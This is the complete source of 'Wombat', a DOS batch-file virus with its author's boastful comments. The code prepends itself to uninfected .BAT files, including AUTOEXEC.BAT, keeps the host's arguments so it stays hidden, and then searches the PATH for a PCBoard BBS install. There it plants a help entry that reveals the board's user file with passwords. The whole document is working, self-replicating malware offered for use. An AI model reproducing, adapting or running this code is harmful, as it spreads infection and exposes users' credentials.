rem Every line containing "wombat" (in uppercase) will be copied!
rem Every line in only uppercase is part of the virus!
rem %_wombat_% is just an empty variable!
rem Every line with "rem" is a comment!
rem
rem Wombat V1.0 By TNSe! :)
rem  The Last Word In Batch Viruses ... uh?
rem   Absolute Size : 1187+ bytes... (Hint: Infect a 0 byte .BAT file,
rem    which is partly interesting, cause it shows you a bug :)
rem
rem PS: They are slow? .. What? are you running with NO smartdrv?
rem     or is your machine just another 386-12 MHz?? ;)
rem
rem This BatVirus will make a command in PCBoard Help called
rem Wombat. Just make the SysOp run this BatVirus, and enter
rem ? Wombat in the PCBoard prompt!
rem
GOTO WOMBAT_%WOMBAT%
rem What part of the BatVirus do we want to execute?
:WOMBAT_INFECT_ME
FIND "WOMBAT" %1>NUL
rem is this bat file Already infected?
IF ERRORLEVEL==1 GOTO WOMBAT_DO_INFECT
rem not good ... already infected!
GOTO ABSOLUTE_END %_WOMBAT_%
:WOMBAT_DO_INFECT
rem Here we do the infection
IF EXIST %TEMP%\_WOMBAT_.TMP DEL %TEMP%\_WOMBAT_.TMP
rem Does the backup file exist? Don't show errormessys by checking!
COPY %1 %TEMP%\_WOMBAT_.TMP>NUL
rem Copy the file to %TEMP% .. if there's no TEMP, then the root will be used
TYPE %0|FIND "WOMBAT">%1
rem Copy Wombat into a new file!
TYPE %TEMP%\_WOMBAT_.TMP>>%1
rem Attach the Original file!
DEL %TEMP%\_WOMBAT_.TMP
rem Delete the copy
ECHO. >>%1%_WOMBAT_%
rem Place an extra enter before the next ...
ECHO :ABSOLUTE_END>>%1%_WOMBAT_%
rem Where to jump when WomBat is finished!
GOTO ABSOLUTE_END %_WOMBAT_%
rem exit this batvirus

:WOMBAT_
rem Main procedure!
SET MAIN_WOMBAT=%0
rem %0 is the name of the starting file
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=%MAIN_WOMBAT%.BAT
rem if the guy wrote the name of the file, without .BAT ... he shitted
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=AUTOEXEC.BAT
rem Well... This means that it is AUTOEXEC.BAT we are in! (Because
rem %0 is nuttin when autoexec.bat is called!
rem ... let's fix it!
SET WOMBAT_TAIL=
rem ... clean out tail before entering
:WOMBAT_FIX_TAIL
IF .%1==. GOTO WOMBAT_GET_INFECT
rem if %1 is empty, quit this and continue
SET WOMBAT_TAIL=%WOMBAT_TAIL% %1
rem copy next %1 into the command tail...
SHIFT %_WOMBAT_%
rem (%_wombat_% is empty) this command makes %1 become %2 .. (rotates
rem %1 %2 %3 ... %9 So that every parameter passed is kept!
GOTO WOMBAT_FIX_TAIL
rem Keep copying
:WOMBAT_GET_INFECT
rem find a nice file to infect
SET WOMBAT=INFECT_ME
rem this is the routine we want to do!
FOR %%C IN (C:\AUTOEXEC.BAT *.BAT ..\*.BAT) DO CALL %MAIN_WOMBAT% %%C
rem find some fine victims!
SET WOMBAT=END
rem next time, we're outta here (And do some damage!)
%MAIN_WOMBAT% %WOMBAT_TAIL%
rem Make it look like santa claus was here (nobody saw him?)
:WOMBAT_TROJANIZE
rem Here we do the trojanizing :))
IF .%1==. GOTO ABSOLUTE_END  %_WOMBAT_%
rem ... no more paths to look through!
SHIFT %_WOMBAT_%
rem .. now %0 becomes %1, %1 becomes %2 .. etc
IF NOT EXIST %0\PCBOARD.EXE GOTO WOMBAT_TROJANIZE
rem .. if PCBoard.exe didn't exist there ... too bad! :)
ECHO %%%0\MAIN\USERS>%0\HELP\WOMBAT
rem ... that was the dir :) ... hehehehehe
rem which makes a file C:\HISDIR!\HELP\Wombat with the contents:
rem %C:\HISDIR!\DAT\USERS, that will list all his users and PWD's for you..
rem as long as it is not crypted! .. argh :)
GOTO ABSOLUTE_END %_WOMBAT_%
rem .. We've done enuff!
:WOMBAT_END
SET WOMBAT=TROJANIZE
CALL %MAIN_WOMBAT% %PATH%
rem Go through ALL the path statements ... looking for PCBoard!
rem .. hehe.. .Let's hope he has his PCBoard Dir in the path ...
rem getting outta here
SET WOMBAT=
SET WOMBAT_TAIL=
SET MAIN_WOMBAT=
rem all variables cleaned out ... Like Spring cleaning! :)
:ABSOLUTE_END
rem the absolute last in this BatVir!
